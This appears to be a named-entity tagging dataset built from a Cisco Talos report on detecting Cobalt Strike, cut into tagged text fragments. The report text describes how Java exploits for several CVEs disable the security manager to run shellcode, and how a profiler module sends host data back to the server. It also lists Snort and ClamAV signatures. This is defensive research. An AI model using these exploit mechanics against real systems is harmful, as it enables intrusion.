and minor Java versions for further processing. It’s important to understand the 
structure of Java version strings. [See https://www.oracle.com/java/technologies/
javase/versioning-naming.html].  
 
""1.",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,.0_,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"""

When the version string for the product is reported as “java version 1.8.0_5”, the 
product will be called ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,JDK 8u5,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,", ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,JDK 8,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," update 5 or, when the update version is not 

https://www.oracle.com/java/technologies/javase/versioning-naming.html
https://www.oracle.com/java/technologies/javase/versioning-naming.html


page 20 of 29© 2020 ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cisco,org
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,". All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

important, ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,JDK 8,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,".

We discovered this module exploits multiple vulnerabilities. 
The ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Java,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," execution flow is as follows:

• ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,<,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"= Java 6u27 -> `Rhino()`

• ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,<,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"= Java 6u45 -> `AppIcon()`

• == Java 7u0 -> `Rhino()`

• ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,<,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"= Java 7u6 -> `Exec()`

• ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,<,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"= Java 7u21 -> `Bean()`

If the regex fails and the version string is equal to “1.7.0” 
also direct execution to `Rhino()`

Main.java

Main.java contains the same code as we saw in the Signed 
Applet attack. Its sole purpose is to run main.dll, or main64.
dll, with the shellcode provided in the “id” parameter by 
interfacing with the ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,JNI,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,". We will touch on how this works a 

bit in the next section.

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,CVE-2011-3544,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike, - ,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Oracle,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike, ,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Java,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," applet rhino script engine 
remote code execution

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Java,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike, Version ,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,<,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,= 1.6.0_27 or ,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Java,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," Version == 7.0

This class is associated with the ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Rhino,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," Script Engine which 
is used to run arbitrary code outside of the ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Java,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," sandbox.

This was dangerous at one point in time because these 
",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,JavaScript,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike, objects were not controlled by the ,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Java,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
SecurityManager. Protections were put in place to limit 
attempts to execution however it was determined that you 
bypass the sandbox limitations by storing ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Java,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," code in a 
string and then executing it. When executing the `toString()` 
method, it returns a ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Java,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," function in the context of the caller 
(Figure 33).

So if we are restricted by the permissions of the caller, 
we are still limited in execution privileges. Instead, we 

Figure 33



page 21 of 29© 2020 ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cisco,org
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,". All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

need to generate an error object containing the code as 
its message. This module extends the Main class. When 
spawning a thread of itself, it will look to see if the class 
implemented `Runnable` and the `run()` function, which 
`Main` does. This means that the goal is to spawn main.dll 
with desired shellcode but from outside the sandbox.

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,CVE 2013-2465,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike, - ,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Oracle,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike, ,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Java,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 2D ImagingLib remote 
code execution

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Java,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike, Version ,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,<,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"= 1.6.0_45

This vulnerability exploits a vulnerability when filtering() 
BufferedImage’s using `AffineTransformOp`.

First, some necessary helper classes are defined 
to assert certain behavior later down the road, 
“ComponentColorModel” and “ICC_ColorSpace” (Figure 34).

Figure 35 shows a defined ColorComponentModel that 

is supplied to the `BufferedImage` constructor to fool a 
specific check within `storeImageArray()`. That check is 
for `(hintP->packing == BYTE_INTERLEAVED)`. When this 
check succeeds, data is written back to the destination. 
The second class defines a ComponentColorModel 
that will always return `True` when calling 
`isCompatibleRaster()`.

Now to prepare an exploit, we move to `loadIcon()`. First, 
we need to prepare the necessary objects for execution. 
The order of the following allocations is extremely 
important as we want them to be aligned in memory 
(Figure 35).

To get a better understanding of Java access control security. 
A `Statement̀  object can represent arbitrary method calls. 
When an instance of `Statement̀  is created, the current 
security context is stored in `Statement.acc .̀ When calling 
`execute()̀  on that statement, ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Java,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," attempts to verify that the 

Figure 34

Figure 35



page 22 of 29© 2020 ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cisco,org
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,". All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

permissions surrounding that call have 
not been changed by looking at the 
value of `Statement.acc .̀ Therefore 
the goal of this exploit is to gain the 
correct permissions on `System.
setSecurityManager()̀  to disable it by 
overwriting it’s `AccessControlContext̀ . 
To prepare for that, a new 
`Permissions̀  object is created with 
`AllPermission()̀  (Figure 36).

Now, comes ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,CVE-2013-2465,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"  
(Figure 37).

Two `BufferedImagè  are created. The 
second uses the dataBufferByte[] 
object we declared earlier. A raster 
is created with a `dataBitOffset` 
that points outside of the 
`dataBufferByte[16]` memory structure. 
",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,CobaltStrike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," then sets the first pixel to 
`0xFFFFFFFF .̀ Finally, the vulnerable 
storeImageArray() call through filter() 
is performed and data is written back 
to the object and corrupts the adjacent 
object’s length.

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," can now loop 
through `iArr[]` until it finds the 
default `Statement.acc` field and 
overwrite it with the `AllPermission` 
object created earlier. Now, 
`setSecurityManger` can be executed 
with the necessary permissions to 
disable it and run shellcode.

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,CVE-2012-4681,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,  - ,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Oracle,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike, ,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Java 7,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
SunToolkit Remote Code Execution

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Java,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike, Version ,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,<,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"= 1.7.0_6

This vulnerability exploits the ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Java,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
`Class.forName()` or `ClassFinder` to 
gain access to private object fields. 
In the context of ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,CobaltStrike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,", this 
resolves around calls to `SetField()` 
from `sun.awt.SunToolkit`. Originally 
in ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Java 6,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,", this was not possible as we 
weren’t allowed to gain a reference 
to `sun.awt.SunToolkit`. In ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Java 7.0_6,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,", 
this changed and introduced ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,CVE-2012-4681,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,".

There are three main methods to this class.

• `check()`

• `SetField()`

• `GetClass()`

Check() is the first function executed in the exploit and the execution path is 
pretty simple. As we saw in ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,CVE-2013-2465,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,", a Statement object is created for 
`setSecurityManager()`, along with a new permissions object.

The next operation is a call to `sf()`, short for `SetField()`, private class method 
with the statement class type, the desired field “acc”, our Statement object, 
and the new permissions we want. `Sun.awt.SunToolkit` is a restricted class 
for untrusted code, normally you wouldn’t be able to gain access in our current 
security context.



page 23 of 29© 2020 ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cisco,org
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,". All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

An adversary could exploit this vulnerability by calling 
`Class.forName()` as the target method of the Expression. In 
reality, `forName()` is not called. Instead, `Expression` uses 
custom logic to load classes without verifying permissions. 
Without `Expression`, this would not be possible.

After returning to `SetField()` with our privileged class 
access, the second issue is exploited to gain access to 
a private field. An adversary could go on to disable the 
security manager and execute arbitrary shellcode.

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,CVE-2013-2460,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike, - ,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Oracle,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike, ,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Java,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," ProviderSkeleton invoke() 
remote code execution

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Java,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike, Version ,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,<,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"= 1.7.0_21

This exploit involves gaining access to a restricted package 
through a public interface.

This exploit can be found in:

•  Bean

•  BeanHelper

•  BeanProvider

The `com.sun.tracing.Provider` and `java.lang.reflect.
InvocationHandler` are the main culprits here. This gives 
access to a `Provider` interface, or `ProviderSkeleton`, and 
provides the base for the target `invoke()` function.

This starts obtaining a lookup method by creating an 
Invocationhandler via ` java.lang.reflect.Proxy`. From there, 
the exploit can obtain a reference to `MethodHandles.
lookup` and call it via the InvocationHanlder defined earlier.

This is most of the work needed to begin exploitation, access 
to the `invoke()̀  method is already provided. But how does 
that give an attacker an opportunity to elevate privileges? The 
invoke method, in ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Java 7u21,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,", does not perform any checks on 
whether or not a public method should be accessible by the 
calling class. See the openjdk commit in Figure 38.

The second issue is that in this case, `invoke()̀  does not 
return the calling blass but instead returns `sun.tracing.
ProviderSkeletoǹ . This all comes together because 
`ProviderSkeletoǹ  is a privileged class. Eventually, ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
loads several classes and, once again, disables the manager.

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," now uses the `displayAd()` (Figure 39) to make 
calls to invoke() and return privileged classes that they 
would otherwise not have access to.

You can see another call to `getMethod()` prior to invoking 
the argument, this function is used to obtain access to the 
familiar `forName()` method. Then once again like earlier, that 
can be called to gain access to restricted classes (Figure 40).

Figure 38

Figure 39

Figure 40



page 24 of 29© 2020 ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cisco,org
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,". All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

Next, three restricted classes are loaded:

• `sun.org.mozilla.javascript.internal.Context`

• `sun.org.mozilla.javascript.internal.DefiningClassLoader`

• `sun.org.mozilla.javascript.internal.GeneratedClassLoader`

This is now used to load the `BeanHelper()` class included 
with the Smart Applet and execute it under a privileged 
context by calling `AccessController.doPrivileged()’, as 
shown in Figure 41.

And the security manager is disabled... again.

Detection

The amount of devices running ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Java,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," is astoundingly 
high still in 2020. It still continues to be a widely used 
language and commonly installed utility for users. These 
vulnerabilities are pretty old, but for the Smart Applet to be 
effective, the amount of vulnerable devices is likely still high 
enough to warrant them being included.

Now, detection here was the easiest part. Remember 
how the landing page was extremely similar to the Signed 
Applet module? Additionally, main.dll/main64.dll is again 
included in the Smart Applet JAR. We already covered it 
with the same detection. Case closed on some old ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Java,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
vulnerabilities with prior coverage.

TARGET MODULE: SYSTEM PROFILER

This module is designed to perform reconnaissance on 
systems visiting a ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"-controlled web server. It is 
important to note that this module is not intended to infect a 
host, but rather supply information on the operating system 
and applications installed on a target.

Payload

When an operator configures the system profiler, there are 
two options for gathering the desired information. The first 
one utilizes a large ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,JavaScript,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," file that leverages multiple 
",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,ActiveX,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," controls to gather information. The second is an 
optional ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Java,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," Applet, a common theme we’ve seen in 
",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,", to supply additional information on top of the 
JS. The final configuration option is a redirect. This makes 
the victim client redirect to another page after performing 
profiling the system.

The initial landing page for the system profiler delivers a 
page with code similar to Figure 42:

Let’s glance over both types for a high-level overview.

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Java,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," Applet

The initial landing page checks to see if ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Java,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," is installed and 
enabled in two different ways. First, it uses `deployJava.
geJREs()` to return an array of installed versions, or an 
empty array if not present. The second is `navigator.

Figure 41

Figure 42



page 25 of 29© 2020 ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cisco,org
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,". All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

javaEnabled()` which is a simple boolean ""True"" or ""False"".

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Java,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike, is installed if either check succeeds. The ,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Java,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," Applet, 
“iecheck.class,” runs on the page, as shown in Figure 43.

The class contains a small code base that only has two 
functions. One is designed to return the version of ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Java,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,", 
the client is running. The other is a little more tricky and is 
geared toward exposing the internal IP address of the client.

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,JavaScript,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

The ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,JavaScript,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," is the bulk of the profiler and a huge file 
weighing in at over 200KB and almost 5,000 lines of code 
(after beautifying it). It checks browser versions, system 
information and installed applications through ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,JavaScript,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
and ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,ActiveX,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," calls.

Some of the checks include but are not limited to web 
browser, operating system, Adobe Acrobat, Adobe Flash 
and more. It also includes another attempt to get the 
internal IP address of the client, just like the ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Java,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," Applet.

Detection

Detection here is pretty straightforward. Since the profiler 
is trying to do so much at once, we can make quick work on 
the landing page by checking HTTP responses.

We want to look for any abnormal combination of 
application version checks by using ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,ActiveX,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," control class 
IDs and object names, static version checks, and attempts 
to load a Java applet. We can also look for attempts to 
store data within a 1x1 (width x height) element named 
`checkip`.

Figure 43

Figure 44



page 26 of 29© 2020 ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cisco,org
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,". All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

Generally speaking, it’s the easiest way to catch 
communication in the response from the client. At the end 
of the “check.js” file, we see an attempt to make an HTTP 
POST request back to the server with whatever information 
was collected (Figure 44).

We can see that the client data section of the HTTP 
post contains the parameters and values sent to the 
`application()` function.

This left us with the following detection:

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Snort,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

• 1:13913 BROWSER-PLUGINS AcroPDF.PDF ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,ActiveX,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
clsid access attempt

• 1:23878 BROWSER-PLUGINS ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Oracle,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike, ,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,JRE,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," Deployment 
Toolkit ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,ActiveX,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," clsid access attempt

• 1:38038 POLICY-OTHER PDF ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,ActiveX,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," CLSID access 
detected

• 1:54180 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," system profil-
ing attempt

• 1:54181 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," system profil-
ing attempt

• 1:54182 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," system profil-
ing attempt

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,ClamAV,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

• ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Java.Malware.CobaltStrike-8008971-0,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

CONCLUSION
This is an in-depth view into the ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," attack 
framework, how Talos researchers analyzed each module 
and the struggles, breakdowns, victories, and detection that 
came along with it.

The research performed resulted in more than 50 
signatures between ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Snort,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike, and ,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,ClamAV,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," combined, covering 
over 400 ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," samples.

It’s important to note that the resulting detection based on 
this research project is intended to provide robust coverage 
for ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," at its core, but is by no means exhaustive. 
Large-scale attack frameworks are always evolving, 
especially highly funded ones such as ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,".

Researchers must target what each security product does 
well and use that to their advantage. With that, you also 
have to know where its weaknesses lie. Having a good 



page 27 of 29© 2020 ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cisco,org
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,". All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

understanding of the strengths and weaknesses in ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Snort,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," or 
",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,ClamAV,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," is key to developing good generic detection.

Does this mean we have covered ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," in its entirety 
and it’s forever dead in the eyes of Talos? No. Does it mean 
we have provided what we believe to be a reasonably high 
level of detection to stop ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," in its current form? 
Most definitely.



page 28 of 29© 2020 Cisco. All rights reserved. talos-external@",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cisco,org
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,".com  |  talosintelligence.com

The art and science of detecting ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

APPENDIX A: COVERAGE

STAGED/STAGELESS EXECUTABLES

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Snort,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

• 1:53656 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," x86 
executable download attempt

• 1:53657 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," x86 
executable download attempt

• 1:53658 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," x64 
executable download attempt

• 1:53659 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," x64 
executable download attempt

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,ClamAV,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

• `",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Win.Trojan.CobaltStrike-7899871-1,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

• `",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Win.Trojan.CobaltStrike-7899872-1,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

SCRIPTED WEB DELIVERY ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,PowerShell,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Snort,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

• 1:45907 MALWARE-CNC ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," DNS beacon 
outbound TXT record **(UPDATED)**

